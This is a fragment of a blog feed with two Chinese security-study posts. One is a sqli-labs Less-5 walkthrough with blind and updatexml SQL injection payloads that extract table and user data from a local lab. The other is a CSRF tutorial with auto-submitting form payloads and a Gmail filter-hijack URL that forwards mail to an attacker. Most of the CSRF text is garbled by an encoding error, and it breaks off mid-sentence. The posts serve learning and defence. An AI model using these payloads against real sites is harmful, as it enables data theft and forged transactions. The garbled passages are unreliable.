    <content type="html"><![CDATA[<h1 id="Less—5-布尔盲注"><a href="#Less—5-布尔盲注" class="headerlink" title="Less—5(布尔盲注)"></a>Less—5(布尔盲注)</h1><p><img src="/.com//image-20250113233740-hp9fm4b.png" alt="image"></p><p>只会回显你已经进入，很明显的布尔盲注</p><h1 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h1><h2 id="1-检查注入点注入类型"><a href="#1-检查注入点注入类型" class="headerlink" title="1.检查注入点注入类型"></a>1.检查注入点注入类型</h2><blockquote><p><a href="http://127.0.0.1/sqli-labs/Less-5/?id=1">http://127.0.0.1/sqli-labs/Less-5/?id=1</a>‘</p></blockquote><h2 id="2-检查有多少列"><a href="#2-检查有多少列" class="headerlink" title="2.检查有多少列"></a>2.检查有多少列</h2><blockquote><p><a href="http://127.0.0.1/sqli-labs/Less-5/?id=1">http://127.0.0.1/sqli-labs/Less-5/?id=1</a>‘ order by 3–+</p></blockquote><h2 id="3-开始猜测爆破"><a href="#3-开始猜测爆破" class="headerlink" title="3.开始猜测爆破"></a>3.开始猜测爆破</h2><blockquote><p><a href="http://127.0.0.1/sqli-labs/Less-5/?id=1">http://127.0.0.1/sqli-labs/Less-5/?id=1</a>‘ and left((select database()),1)&#x3D;’s’ –+</p></blockquote><p>方法一：采用burpsuite一位一位字符的爆破intruder</p><p>方法二：采用burpsuite转换位ascii码进行爆破，二分法,但是因为在<span data-type="text" style="background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);">未选择库时候用select database()转化为ascii码时它为NULL，所以是错误的</span></p><blockquote><p>?id&#x3D;1’ ascii(substr((select database()),1,1))&gt;156–+</p><p><img src="/.com//image-20250114002516-rrufe5u.png" alt="image"></p></blockquote><p>方法三：直接爆库名</p><h3 id="报错注入流程"><a href="#报错注入流程" class="headerlink" title="报错注入流程"></a>报错注入流程</h3><blockquote><p>1、寻找注入点2、判断字符型还是数字型3、判断闭合方式</p><p><strong>4、使用updatexml查表</strong>  ?id&#x3D;1’ and updatexml(1,concat(0x7e,database(),0x7e),3) –+  <strong>(0x7e是~，为了使我们找出来的更好的分辨展示出来)为什么要加1和3是因为updatexml函数需要三个参数</strong></p><p>系统执行的语句：SELECT * FROM users WHERE id&#x3D;’1’ and updatexml(1,concat(0x7e,database(),0x7e),3) – ‘ LIMIT 0,1</p><p><strong>5、使用updatexml查找表名</strong></p><p>?id’&#x3D;1’ and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema &#x3D; ‘security’),0x7e),3) –+</p><p><strong>6、使用updatexmml查询列名</strong></p><p>?id&#x3D;1’ and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema &#x3D; ‘security’ and table_name &#x3D; ‘users’),3) –+</p><p><strong>7、查询具体数据</strong></p><p>?id&#x3D;1’ and updatexml(1,concat(0x7e,(select group_concat(username) from users),0x7e),3) –+   <strong>（爆不出全部，因为xpath只会报错32个字符，对于输出结果大于32个字符的命令，要用substr函数截取后分段输出）</strong></p><p>?id&#x3D;1’ and updatexml(1,concat(0x7e,substr((select group_concat(username) from users),1,31),0x7e),3) –+   <strong>(substr也要三个参数，后面两个是爆的范围，group_concat和limit不能一起用)</strong></p></blockquote><p>‍</p><p>详细解释查看布尔盲注</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>注入漏洞</category>
      
      <category>SQL注入</category>
      
      <category>sql注入靶场</category>
      
      <category>sql——labs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Less—5(布尔盲注)</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSRF</title>
    <link href="/2024/05/20/Web/CSRF/"/>
    <url>/2024/05/20/Web/CSRF/</url>
    
    <content type="html"><![CDATA[<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="一、什么是CSRF"><a href="#一、什么是CSRF" class="headerlink" title="一、什么是CSRF?"></a>一、什么是CSRF?</h2><blockquote><p>CSRF (Cross-site request forgery跨站请求伪造)也称为One Click Attack或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本(XSS)，但它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装成受信任用户请求受信任的网站。</p><p>简单的说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己以前认证过的站点并运行一些操作（如发邮件，发消息，甚至财产操作（如转账和购买商品））。因为浏览器曾经认证过，所以被访问的站点会觉得这是真正的用户操作而去运行。</p></blockquote><h2 id="浜屻€乕CSRF鏀诲嚮-https-so-csdn-net-so-search-q-CSRF-E6-94-BB-E5-87-BB-spm-1001-2101-3001-7020-鍘熺悊鍙婅繃绋"><a href="#浜屻€乕CSRF鏀诲嚮-https-so-csdn-net-so-search-q-CSRF-E6-94-BB-E5-87-BB-spm-1001-2101-3001-7020-鍘熺悊鍙婅繃绋" class="headerlink" title="浜屻€乕CSRF鏀诲嚮](https://so.csdn.net/so/search?q=CSRF%E6%94%BB%E5%87%BB&amp;spm=1001.2101.3001.7020)鍘熺悊鍙婅繃绋"></a>浜屻€乕CSRF鏀诲嚮](<a href="https://so.csdn.net/so/search?q=CSRF%E6%94%BB%E5%87%BB&spm=1001.2101.3001.7020)%E9%8D%98%E7%86%BA%E6%82%8A%E9%8D%99%E5%A9%85%E7%B9%83%E7%BB%8B">https://so.csdn.net/so/search?q=CSRF%E6%94%BB%E5%87%BB&amp;spm=1001.2101.3001.7020)鍘熺悊鍙婅繃绋</a></h2><blockquote><p>CSRF涓轰粈涔堣兘澶熸敾鍑绘垚鍔?</p><p>鍏舵湰璐ㄥ師鍥犳槸閲嶈鎿嶄綔鐨勬墍鏈夊弬鏁伴兘鏄彲浠ヨ鏀诲嚮鑰呯寽娴嬪埌鐨勩€</p><p>鏀诲嚮鑰呭彧鏈夐娴嬪嚭URL鐨勬墍鏈夊弬鏁颁笌鍙傛暟鍊硷紝鎵嶈兘鎴愬姛鍦版瀯閫犱竴涓吉閫犵殑璇锋眰;鍙嶄箣锛屾敾鍑昏€呭皢鏃犳硶鏀诲嚮鎴愬姛銆</p></blockquote><p><img src="/.com//image-20250520024626-zm1u5u8.png" alt="image"></p><p>浠庝笂鍥捐兘澶熺湅鍑猴紝瑕佸畬姣曚竴娆SRF鏀诲嚮锛屽彈瀹宠€呭繀椤讳緷娆″畬姣曚袱涓楠わ細</p><blockquote><pre><code class="hljs">    鐧诲綍鍙椾俊浠荤珯鐐笰锛屽苟鍦ㄦ湰鍦扮敓鎴怌ookie銆�    鍦ㄤ笉鐧诲嚭A鐨勬儏鍐典笅锛岃闂嵄鎬ョ珯鐐笲銆�</code></pre></blockquote><p><img src="/.com//image-20250520024642-rrrnihd.png" alt="image"></p><blockquote><p>1銆佸鎴风閫氳繃璐︽埛瀵嗙爜鐧诲綍璁块棶缃戠珯A銆�<br>2銆佺綉绔橝楠岃瘉瀹㈡埛绔橝鐢熸垚涓€涓猻essionlD锛屽苟杩斿洖缁欏鎴风瀛樺偍鍦ㄦ祻瑙堝櫒涓€<br>2銆佺綉绔橝楠岃瘉瀹㈡埛绔殑璐﹀彿瀵嗙爜锛屾垚鍔熷垯鐢熸垚涓€涓猻essionlD锛屽苟杩斿洖缁欏鎴风瀛樺偍鍦ㄦ祻瑙堝櫒涓€�<br>3銆佽瀹㈡埛绔疶ab鈥斾釜鏂伴〉闈㈣闂簡缃戠珯B銆�<br>4銆佺綉绔橞鑷姩瑙﹀彂瑕佹眰璇ュ鎴风璁块棶缃戠珯A銆�(鍗冲湪缃戠珯B涓湁閾炬帴鎸囧悜缃戠珯A)<br>5銆佸鎴风閫氳繃缃戠珯B涓殑閾炬帴璁块棶缃戠珯A銆�(姝ゆ椂鎼哄甫鏈夊悎娉曠殑SessionID杩涜璁块棶绔橝鐨�)<br>6銆佹鏃剁綉绔橝鍙渶妫€楠宻essionIlD鏄惁鍚堟硶锛屽悎娉曞垯鎵ц鐩稿簲鐨勬搷浣溿€�(鍥犳鍏蜂綋鍟ュ伐鍏峰氨寰楃湅閾炬帴锛屼互鍙婄綉绔橞瑕佹眰璁块棶鏃舵惡甯︾殑鏁版嵁)</p></blockquote><p>鎵€浠ヨ琚獵SRF鏀诲嚮锛屽繀椤诲悓鏃舵弧瓒充袱涓潯浠讹細</p><p>鐧诲綍鍙椾俊浠荤綉绔橝锛屽苟鍦ㄦ湰鍦扮敓鎴怌ookie銆� 鍦ㄤ笉鐧诲嚭A鐨勬儏鍐典笅锛岃闂嵄闄╃綉绔橞銆�</p><hr><h2 id="涓夈€丆SRF鍒嗙被"><a href="#涓夈€丆SRF鍒嗙被" class="headerlink" title="涓夈€丆SRF鍒嗙被"></a>涓夈€丆SRF鍒嗙被</h2><p>CSRF(Cross-Site Request Forgery)锛岃窡XSS婕忔礊鏀诲嚮涓€鏍凤紝瀛樺湪宸ㄥぇ鐨勫嵄瀹虫€с€�</p><p>浣犲彲浠ヨ繖涔堟潵鐞嗚В:鏀诲嚮鑰呯洍鐢ㄤ簡浣犵殑韬唤锛屼互浣犵殑鍚嶄箟鍙戦€佹伓鎰忚姹傦紝瀵规湇鍔″櫒鏉ヨ杩欎釜璇锋眰鏄畬鍏ㄥ悎娉曠殑锛屼絾鏄嵈瀹屾垚浜嗘敾鍑昏€呮墍鏈熸湜鐨勪竴涓搷浣滐紝姣斿浠ヤ綘鐨勫悕涔夊彂閫侀偖浠躲€佸彂娑堟伅锛岀洍鍙栦綘鐨勮处鍙凤紝娣诲姞绯荤粺绠＄悊鍛橈紝鐢氳嚦浜庤喘涔板晢鍝併€佽櫄鎷熻揣甯佽浆璐︾瓑</p><h3 id="1-GET绫诲瀷鐨凜SRF"><a href="#1-GET绫诲瀷鐨凜SRF" class="headerlink" title="1. GET绫诲瀷鐨凜SRF"></a>1. GET绫诲瀷鐨凜SRF</h3><p>1.GET绫诲瀷鐨凜SRF</p><p>浠呬粎椤昏涓€涓狧TTP璇锋眰銆傚氨鑳藉鏋勯€犱竴娆＄畝鍗曠殑CSRF銆�</p><p>鏍蜂緥锛�</p><p>閾惰绔欑偣A锛氬畠浠ET璇锋眰鏉ュ畬姣曢摱琛岃浆璐︾殑鎿嶄綔锛屽锛�</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000 <br></code></pre></td></tr></table></figure><p>鍗遍櫓绔欑偣B锛氬畠閲岄潰鏈変竴娈礖TML鐨勪唬鐮佷緥濡備互涓嬶細</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;img src=<span class="hljs-attr">http</span>:<span class="hljs-comment">//www.mybank.com/Transfer.php?toBankId=11&amp;money=1000&gt;</span><br></code></pre></td></tr></table></figure><p>棣栧厛銆備綘鐧诲綍浜嗛摱琛岀珯鐐笰锛岀劧鍚庤闂嵄闄╃珯鐐笲锛屽櫌锛岃繖鏃朵綘浼氬彂鐜颁綘鐨勯摱琛岃处鎴峰皯浜�1000鍧椼€�</p><p>涓轰粈涔堜細杩欐牱鍛紵鍘熷洜鏄摱琛岀珯鐐笰杩濆弽浜咹TTP瑙勮寖锛屼娇鐢℅ET璇锋眰鏇存柊璧勬簮銆�</p><p>鍦ㄨ闂嵄闄╃珯鐐笲鐨勪箣鍓嶃€備綘宸茬粡鐧诲綍浜嗛摱琛岀珯鐐笰锛岃€孊涓殑 涓€涓悎娉曠殑璇锋眰锛屼絾杩欓噷琚笉娉曞垎瀛愬埄鐢ㄤ簡锛夈€�</p><p>鎵€浠ヤ綘鐨勬祻瑙堝櫒浼氬甫涓婁綘鐨勯摱琛岀珯鐐笰鐨凜ookie鍙戝嚭Get璇锋眰锛屽幓鑾峰彇璧勬簮浠ET鐨勬柟寮忚姹傜涓夋柟璧勬簮锛堣繖閲岀殑绗笁鏂瑰氨鏄寚閾惰绔欑偣浜嗭級锛�</p><p>鍘熸湰杩欐槸锛�</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-attr">http</span>:<span class="hljs-comment">//www.mybank.com/Transfer.php?toBankId=11&amp;money=1000</span><br></code></pre></td></tr></table></figure><p>缁撴灉閾惰绔欑偣鏈嶅姟鍣ㄦ敹鍒拌姹傚悗锛岃寰楄繖鏄竴涓洿鏂拌祫婧愭搷浣滐紙杞处鎿嶄綔锛夛紝鎵€浠ュ氨绔嬮┈杩涜杞处鎿嶄綔銆�</p><h3 id="2-POST绫诲瀷鐨凜SRF"><a href="#2-POST绫诲瀷鐨凜SRF" class="headerlink" title="2. POST绫诲瀷鐨凜SRF"></a>2. POST绫诲瀷鐨凜SRF</h3><p>鍦–SRF鏀诲嚮娴佽涔嬪垵锛屾浘缁忔湁涓€绉嶉敊璇殑瑙傜偣锛岃涓篊SRF鏀诲嚮鍙兘鐢盙ET璇锋眰鍙戣捣銆傚洜姝ゅ緢澶氬紑鍙戣€呴兘璁や负鍙鎶婇噸瑕佺殑鎿嶄綔鏀规垚鍙厑璁窹OST璇锋眰锛屽氨鑳介槻姝SRF鏀诲嚮銆�</p><p>杩欐牱鐨勯敊璇鐐瑰舰鎴愮殑鍘熷洜涓昏鍦ㄤ簬锛屽ぇ澶氭暟CSRF鏀诲嚮鍙戣捣鏃讹紝浣跨敤鐨凥TML鏍囩閮芥槸<image>銆�<iframe>銆�<script>绛夊甫鈥渟rc&quot;灞炴€х殑鏍囩锛岃繖绫绘爣绛惧彧鑳藉鍙戣捣涓€娆ET璇锋眰锛岃€屼笉鑳藉彂璧稰OST璇锋眰銆�</p><p>鑰屽浜庡緢澶氱綉绔欑殑搴旂敤鏉ヨ锛屼竴浜涢噸瑕佹搷浣滃苟鏈弗鏍煎湴鍖哄垎GET涓嶱OST锛屾敾鍑昏€呭彲浠ヤ娇鐢℅ET鏉ヨ姹傝〃鍗曠殑鎻愪氦鍦板潃銆傛瘮濡傚湪PHP涓紝濡傛灉浣跨敤鐨勬槸$_REQUEST锛岃€岄潪$_POST鑾峰彇鍙橀噺锛屽垯浼氬瓨鍦ㄨ繖涓棶棰樸€�</p><p>瀵逛簬涓€涓〃鍗曟潵璇达紝鐢ㄦ埛寰€寰€涔熷氨鍙互浣跨敤GET鏂瑰紡鎻愪氦鍙傛暟銆傛瘮濡備互涓嬭〃鍗�:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;form action=<span class="hljs-string">&quot; / register&quot;</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;register&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> &gt;<br>&lt;input <span class="hljs-built_in">type</span>=text name=<span class="hljs-string">&quot;username&quot;</span> value=<span class="hljs-string">&quot;&quot;</span> /&gt;<br>&lt;input <span class="hljs-built_in">type</span>=password name=<span class="hljs-string">&quot;password&quot;</span> value=<span class="hljs-string">&quot;&quot;</span> /&gt;<br>&lt;input <span class="hljs-built_in">type</span>=submit name=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;submit&quot;</span> /&gt;<br>&lt;/form&gt;<br></code></pre></td></tr></table></figure><p>鐢ㄦ埛鍙皾璇曟瀯閫犱竴涓狦ET璇锋眰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http: //host/register?username=<span class="hljs-built_in">test</span>&amp;password=passwd<br></code></pre></td></tr></table></figure><p>鏉ユ彁浜わ紝鑻ユ湇鍔″櫒绔湭瀵硅姹傛柟娉曡繘琛岄檺鍒讹紝鍒欒繖涓姹備細閫氳繃銆�</p><p>濡傛灉鏈嶅姟鍣ㄧ宸茬粡鍖哄垎浜咷ET涓嶱OST锛岄偅涔堟敾鍑昏€呮湁浠€涔堟柟娉曞憿?瀵逛簬鏀诲嚮鑰呮潵璇达紝鑻ュ共绉嶆柟娉曞彲浠ユ瀯閫犲嚭涓€涓狿OST璇锋眰銆�</p><p>鏈€绠€鍗曠殑鏂规硶锛屽氨鏄湪涓€涓〉闈腑鏋勯€犲ソ涓€涓〃鍗曡〃鍗曪紝鐒跺悗浣跨敤JavaScript鑷姩鎻愪氦杩欎釜琛ㄥ崟銆傛瘮濡傦紝鏀诲嚮鑰呭湪<a href="http://www.b.com/test.html%E6%B6%93%EE%85%A0%E7%B4%AA%E9%8D%90%E6%AC%8F%EE%9B%A7%E6%B6%93%E5%AC%A9%E5%94%AC%E9%90%AE%E4%BE%8A%E7%B4%B0">www.b.com/test.html涓紪鍐欏涓嬩唬鐮侊細</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;form action=<span class="hljs-string">&quot;http: / / www . a.com/register&quot;</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;register&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> &gt;&lt;input <span class="hljs-built_in">type</span>=text name=<span class="hljs-string">&quot;username&quot;</span> value=<span class="hljs-string">&quot;&quot;</span>/&gt;<br>&lt;input <span class="hljs-built_in">type</span>=password name=<span class="hljs-string">&quot;password&quot;</span> value=<span class="hljs-string">&quot;&quot;</span>/&gt;&lt;input <span class="hljs-built_in">type</span>=submit name=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;submit&quot;</span>/&gt;&lt;/ form&gt;<br>&lt;script&gt;<br>var f = document.getElementById ( <span class="hljs-string">&quot;register&quot;</span>);<br>f.inputs [0].value = <span class="hljs-string">&quot;test&quot;</span>;<br>f.inputs [1].value = <span class="hljs-string">&quot;passwd&quot;</span> ;<br>f.submit ();<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>鏀诲嚮鑰呯敋鑷冲彲浠ュ皢杩欎釜椤甸潰闅愯棌鍦ㄤ竴涓笉鍙鐨刬frame绐楀彛涓紝閭ｄ箞鏁翠釜鑷姩鎻愪氦琛ㄥ崟鐨勮繃绋嬶紝瀵逛簬鐢ㄦ埛鏉ヨ涔熸槸涓嶅彲瑙佺殑銆�</p><p>鍦�2007骞寸殑Gmail CSRF婕忔礊鏀诲嚮杩囩▼涓紝瀹夊叏鐮旂┒鑰卲dp灞曠ず浜嗚繖涓€鎶€宸с€傞鍏堬紝鐢ㄦ埛闇€瑕佺櫥褰旼mail璐︽埛锛屼互渚胯娴忚鍣ㄨ幏寰桮mail鐨勪复鏃禖ookie銆�</p><p><img src="/assets/image-20250520025130-b7gdarh.png" alt="image"></p><p>鐢ㄦ埛鐧诲綍Gmail</p><p>鐒跺悗锛屾敾鍑昏€呰浣跨敤鎴疯闂竴涓伓鎰忛〉闈€€�</p><p><img src="/assets/image-20250520025142-8swgbme.png" alt="image"></p><p>鏀诲嚮鑰呰浣跨敤鎴疯闂伓鎰忛〉闈�</p><p>鍦ㄨ繖涓伓鎰忛〉闈腑锛岄殣钘忎簡涓€涓猧frame锛宨frame鐨勫湴鍧€鎸囧悜pdp鍐欑殑CSRF鏋勯€犻〉闈€€�</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http: //www.gnucitizen.org/util/csrf?_method=POST&amp;_enctype=multipart/form-data&amp;_action=https%3A//mail.google.com/mail/h/ewtljmuj4ddv/%3Fv%3Dprf&amp;cf2_emc=<span class="hljs-literal">true</span>&amp;cf2_email=evilinboxmailinator.com&amp;cfl_from&amp;cfl_toucf1_subjicf1_has&amp;cfl_hasnotscf1_attach=truestfi&amp;S=z&amp;irf=on&amp;nvp bu_cftb=Create%20Filter<br></code></pre></td></tr></table></figure></blockquote><p>杩欎釜閾炬帴鐨勫疄闄呬綔鐢ㄥ氨鏄妸鍙傛暟鐢熸垚涓€涓狿OST鐨勮〃鍗曪紝骞惰嚜鍔ㄦ彁浜ゃ€�<br>鐢变簬娴忚鍣ㄤ腑宸茬粡瀛樺湪Gmail鐨勪复鏃禖ookie锛屾墍浠ョ敤鎴峰湪iframe涓Gmail鍙戣捣鐨勮繖娆¤姹備細鎴愬姛鈥曗€旈偖绠辩殑Filter涓細鏂板垱寤轰竴鏉¤鍒欙紝灏嗘墍鏈夊甫闄勪欢鐨勯偖浠堕兘杞彂鍒版敾鍑昏€呯殑閭涓€�</p><p><img src="/assets/image-20250520025208-tr38ddf.png" alt="image"></p><p>鎭舵剰绔欑偣閫氳繃CSRF鍦ㄧ敤鎴风殑Gmail涓缓绔嬩竴鏉¤鍒欍€�</p><p>濡傛灉涓婅堪渚嬪瓙鐪嬪緱杩樻槸鏈夌偣鎳甸€硷紝閭ｅ啀涓句竴涓緥瀛愶細</p><p>鍦ㄦ櫘閫氱敤鎴风殑鐪间腑锛岀偣鍑荤綉椤�-&gt;鎵撳紑璇曠湅瑙嗛-&gt;璐拱瑙嗛鏄竴涓緢姝ｅ父鐨勪竴涓祦绋嬨€傚彲鏄湪鏀诲嚮鑰呯殑鐪间腑鍙互绠楁甯镐絾鍙堜笉姝ｅ父鐨勶紝褰撶劧涓嶆甯哥殑鎯呭喌涓嬶紝鏄湪寮€鍙戣€呭畨鍏ㄦ剰璇嗕笉瓒虫墍閫犳垚鐨勩€傛敾鍑昏€呭湪璐拱澶勬姄鍒拌喘涔版椂鍊欑綉绔欏鐞嗚喘涔�(鎵ｉ櫎)鐢ㄦ埛浣欓鐨勫湴鍧€銆�</p><p>姣斿:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/coures/u</span>ser<span class="hljs-regexp">/handler666buy.php&lt;/</span>font&gt;<br></code></pre></td></tr></table></figure><p>閫氳繃鎻愪氦琛ㄥ崟锛宐uy.php澶勭悊璐拱鐨勪俊鎭紝杩欓噷鐨�666涓鸿棰慖D銆傞偅涔堟敾鍑昏€呯幇鍦ㄦ瀯閫犱竴涓摼鎺ワ紝閾炬帴涓寘鍚互涓嬪唴瀹广€�</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;form action=/coures/user/handler/666/buy method=POST&gt;<br>&lt;input <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;xx&quot;</span> value=<span class="hljs-string">&quot;xx&quot;</span> /&gt;<br>&lt;/form&gt;<br>&lt;script&gt; document.forms[0].submit(); &lt;/script&gt;<br></code></pre></td></tr></table></figure><p>褰撶敤鎴疯闂椤甸潰鍚庯紝琛ㄥ崟浼氳嚜鍔ㄦ彁浜わ紝鐩稿綋浜庢ā鎷熺敤鎴峰畬鎴愪簡涓€娆OST鎿嶄綔锛岃嚜鍔ㄨ喘涔颁簡id涓�666鐨勮棰戯紝浠庤€屽鑷村彈瀹宠€呬綑棰濇墸闄ゃ€�</p><hr><h2 id="鍥涖€丆SRF婕忔礊鐨勬寲鎺�"><a href="#鍥涖€丆SRF婕忔礊鐨勬寲鎺�" class="headerlink" title="鍥涖€丆SRF婕忔礊鐨勬寲鎺�"></a>鍥涖€丆SRF婕忔礊鐨勬寲鎺�</h2><p>1銆佹渶绠€鍗曠殑鏂规硶灏辨槸鎶撳彇涓€涓甯歌姹傜殑鏁版嵁鍖咃紝濡傛灉娌℃湁Referer瀛楁鍜宼oken锛岄偅涔堟瀬鏈夊彲鑳藉瓨鍦–SRF婕忔礊銆�</p><p>2銆佸鏋滄湁Referer瀛楁锛屼絾鏄幓鎺塕eferer瀛楁鍚庡啀閲嶆柊鎻愪氦锛屽鏋滆鎻愪氦杩樻湁鏁堬紝閭ｄ箞鍩烘湰涓婂彲浠ョ‘瀹氬瓨鍦–SRF婕忔礊銆�</p><p>3銆侀殢鐫€瀵笴SRF婕忔礊鐮旂┒鐨勪笉鏂繁鍏ワ紝涓嶆柇娑岀幇鍑轰竴浜涗笓闂ㄩ拡瀵笴SRF婕忔礊杩涜妫€娴嬬殑宸ュ叿锛屽CSRFTester锛孋SRF Request Builder绛夈€備互CSRFTester宸ュ叿涓轰緥锛孋SRF婕忔礊妫€娴嬪伐鍏风殑娴嬭瘯鍘熺悊濡備笅:</p><p>浣跨敤CSRFTester杩涜娴嬭瘯鏃讹紝棣栧厛闇€瑕佹姄鍙栨垜浠湪娴忚鍣ㄤ腑璁块棶杩囩殑鎵€鏈夐摼鎺ヤ互鍙婃墍鏈夌殑琛ㄥ崟绛変俊鎭紝鐒跺悗閫氳繃鍦–SRFTester涓慨鏀圭浉搴旂殑琛ㄥ崟绛変俊鎭紝閲嶆柊鎻愪氦锛岃繖鐩稿綋浜庝竴娆′吉閫犲鎴风璇锋眰銆�</p><p>濡傛灉淇敼鍚庣殑娴嬭瘯璇锋眰鎴愬姛琚綉绔欐湇鍔″櫒鎺ュ彈锛屽垯璇存槑瀛樺湪CSRF婕忔礊锛屽綋鐒舵娆惧伐鍏蜂篃鍙互琚敤鏉ヨ繘琛孋SRF鏀诲嚮銆�</p><hr><h2 id="浜斻€丆SRF婕忔礊鐨勯槻寰�"><a href="#浜斻€丆SRF婕忔礊鐨勯槻寰�" class="headerlink" title="浜斻€丆SRF婕忔礊鐨勯槻寰�"></a>浜斻€丆SRF婕忔礊鐨勯槻寰�</h2><h3 id="1銆侀獙璇佺爜"><a href="#1銆侀獙璇佺爜" class="headerlink" title="1銆侀獙璇佺爜"></a>1銆侀獙璇佺爜</h3><p>==楠岃瘉鐮佽璁や负鏄鎶桟SRF鏀诲嚮鏈€绠€娲佽€屾湁鏁堢殑闃插尽鏂规硶銆�==</p><p>CSRF鏀诲嚮鐨勮繃绋嬶紝寰€寰€鏄湪鐢ㄦ埛涓嶇煡鎯呯殑鎯呭喌涓嬫瀯閫犱簡缃戠粶璇锋眰銆傝€岄獙璇佺爜锛屽垯寮哄埗鐢ㄦ埛蹇呴』涓庡簲鐢ㄨ繘琛屼氦浜掞紝鎵嶈兘瀹屾垚鏈€缁堣姹傘€傚洜姝ゅ湪閫氬父鎯呭喌涓嬶紝楠岃瘉鐮佽兘澶熷緢濂藉湴閬忓埗CSRF鏀诲嚮銆�</p><p>浣嗘槸楠岃瘉鐮佸苟闈炰竾鑳姐€傚緢澶氭椂鍊欙紝鍑轰簬鐢ㄦ埛浣撻獙鑰冭檻锛岀綉绔欎笉鑳界粰鎵€鏈夌殑鎿嶄綔閮藉姞涓婇獙璇佺爜銆傚洜姝わ紝楠岃瘉鐮佸彧鑳戒綔涓洪槻寰SRF鐨勪竴绉嶈緟鍔╂墜娈碉紝鑰屼笉鑳戒綔涓烘渶涓昏鐨勮В鍐虫柟妗堛€�</p><h3 id="2銆佸湪璇锋眰鍦板潃涓坊鍔�-token-骞堕獙璇�"><a href="#2銆佸湪璇锋眰鍦板潃涓坊鍔�-token-骞堕獙璇�" class="headerlink" title="2銆佸湪璇锋眰鍦板潃涓坊鍔� token 骞堕獙璇�"></a>2銆佸湪璇锋眰鍦板潃涓坊鍔� token 骞堕獙璇�</h3><p>CSRF 鏀诲嚮涔嬫墍浠ヨ兘澶熸垚鍔燂紝鏄洜涓洪粦瀹㈠彲浠ュ畬鍏ㄤ吉閫犵敤鎴风殑璇锋眰锛岃璇锋眰涓墍鏈夌殑鐢ㄦ埛楠岃瘉淇℃伅閮芥槸瀛樺湪浜� cookie 涓紝鍥犳榛戝鍙互鍦ㄤ笉鐭ラ亾杩欎簺楠岃瘉淇℃伅鐨勬儏鍐典笅鐩存帴鍒╃敤鐢ㄦ埛鑷繁鐨� cookie 鏉ラ€氳繃瀹夊叏楠岃瘉銆�</p><p>瑕佹姷寰� CSRF鍏抽敭鍦ㄤ簬鍦ㄨ姹備腑鏀惧叆榛戝鎵€涓嶈兘浼€犵殑淇℃伅锛屽苟涓旇淇℃伅涓嶅瓨鍦ㄤ簬 cookie 涔嬩腑銆�</p><p><span data-type="text" style="color: var(--b3-font-color8);">鍙互鍦� HTTP 璇锋眰涓互鍙傛暟鐨勫舰寮忓姞鍏ヤ竴涓殢鏈轰骇鐢熺殑 token锛屽苟鍦ㄦ湇鍔″櫒绔缓绔嬩竴涓嫤鎴櫒鏉ラ獙璇佽繖token锛屽鏋滆姹備腑娌℃湁 token 鎴栬€� token 鍐呭涓嶆纭紝鍒欒涓哄彲鑳芥槸 CSRF 鏀诲嚮鑰屾嫆缁濊璇锋眰銆�</span></p><p><img src="/assets/image-20250520025334-kgrwlzn.png" alt="image"></p><p>杩欑鏂规硶瑕佹瘮妫€鏌� Referer瑕佸畨鍏ㄤ竴浜涳紝token 鍙互鍦ㄧ敤鎴风櫥闄嗗悗浜х敓骞舵斁浜� session 涔嬩腑锛岀劧鍚庡湪姣忔璇锋眰鏃舵妸 token 浠� session 涓嬁鍑猴紝涓庤姹備腑鐨� token 杩涜姣斿锛屼絾杩欑鏂规硶鐨勯毦鐐瑰湪浜庡浣曟妸 token 浠ュ弬鏁扮殑褰㈠紡鍔犲叆璇锋眰銆�</p><p>瀵逛簬 GET 璇锋眰锛宼oken 灏嗛檮鍦ㄨ姹傚湴鍧€涔嬪悗锛岃繖鏍� URL 灏卞彉鎴� <a href="http://url/?csrftoken=tokenvalue%E9%8A%86%EF%BF%BD">http://url?csrftoken=tokenvalue銆�</a> 鑰屽浜� POST 